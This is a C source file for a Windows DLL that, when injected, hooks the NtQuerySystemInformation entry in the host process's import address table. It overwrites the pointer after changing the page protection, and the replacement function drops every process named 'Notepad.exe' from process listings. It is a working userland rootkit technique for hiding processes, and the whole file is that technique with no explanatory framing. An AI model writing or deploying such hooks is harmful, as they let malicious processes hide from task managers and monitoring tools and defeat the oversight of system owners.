#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#pragma comment(lib,"ntdll.lib")

struct arbel
{
	DWORD* address;
	DWORD* first_thunk;
};
typedef struct arbel Struct;


typedef int(__stdcall* FunctionLikeMessageBox)(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType);

typedef NTSTATUS(WINAPI* PNT_QUERY_SYSTEM_INFORMATION)(
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
	);

PNT_QUERY_SYSTEM_INFORMATION OriginalNtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)(& NtQuerySystemInformation);

NTSTATUS WINAPI Hooked_NtQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength)
{
	NTSTATUS stat = OriginalNtQuerySystemInformation(
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength);

	if (SystemProcessInformation == SystemInformationClass && stat == 0)
	{
		PSYSTEM_PROCESS_INFORMATION prev = (PSYSTEM_PROCESS_INFORMATION)(SystemInformation);
		PSYSTEM_PROCESS_INFORMATION curr = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)prev + prev->NextEntryOffset);

		while (prev->NextEntryOffset != NULL) {
			if (lstrcmp(curr->ImageName.Buffer, L"Notepad.exe") == 0) {
				prev->NextEntryOffset += curr->NextEntryOffset;
			}
			else {
				prev = curr;
			}
			curr = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)curr + curr->NextEntryOffset);
		}
	}

	return stat;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH: {}
						   OutputDebugStringA("test\n");
						   Struct s;
						   void* base_address = GetModuleHandle(0);
						   OutputDebugStringA(base_address);
						   PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)base_address;
						   PIMAGE_NT_HEADERS NTHeaders;
						   NTHeaders = (PIMAGE_NT_HEADERS)(dosHeader->e_lfanew + (char*)base_address);
						   PIMAGE_OPTIONAL_HEADER32 optionalHeader;
						   optionalHeader = (PIMAGE_OPTIONAL_HEADER32) & (NTHeaders->OptionalHeader);
						   PIMAGE_DATA_DIRECTORY data_directory = (PIMAGE_DATA_DIRECTORY) & (optionalHeader->DataDirectory[1]);
						   PIMAGE_IMPORT_DESCRIPTOR import_array = (PIMAGE_IMPORT_DESCRIPTOR)((char*)(base_address)+data_directory->VirtualAddress);
						   int check = 1;
						   while (import_array->Name != 0 && check != 0) {
							   DWORD dll_name = import_array->Name;
							   char* firstdll = (char*)(base_address)+dll_name;
							   OutputDebugStringA(firstdll);
							   if (strcmp(firstdll, "ntdll.dll") == 0) {
								   PIMAGE_THUNK_DATA original_first_thunk = (PIMAGE_THUNK_DATA)(import_array->OriginalFirstThunk + (char*)(base_address));
								   PIMAGE_THUNK_DATA first_thunk = (PIMAGE_THUNK_DATA)(import_array->FirstThunk + (char*)(base_address));
								   PIMAGE_THUNK_DATA first = first_thunk;
								   while ((char*)first_thunk != 0 && check != 0) {
									   DWORD* names_array = (DWORD*)(original_first_thunk->u1.AddressOfData + (char*)(base_address));
									   char* names = (char*)names_array;
									   char name[50];
									   strcpy(name, names + 2);
									   OutputDebugStringA(name);
									   if (strcmp(name, "NtQuerySystemInformation") == 0) {
										   s.address = &first_thunk->u1.Function;
										   s.first_thunk = &first;
										   check = 0;
									   }
									   original_first_thunk += 1;
									   first_thunk += 1;
								   }
							   }
							   import_array += 1;
						   }
						   DWORD dwOldProtect;
						   DWORD* aligned_address = (int)s.address - ((int)s.address % 0x1000);
						   VirtualProtect(aligned_address, 0x1000, PAGE_EXECUTE_READWRITE, &dwOldProtect);
						   void** func_address = s.address;
						   *func_address = &Hooked_NtQuerySystemInformation;
						   DWORD dwOldProtect2;
						   VirtualProtect(aligned_address, 0x1000, PAGE_EXECUTE_READ, &dwOldProtect2);
						   break;

	case DLL_PROCESS_DETACH:
		break;

	case DLL_THREAD_ATTACH:
		break;

	case DLL_THREAD_DETACH:
		break;
	}

	return TRUE;
}

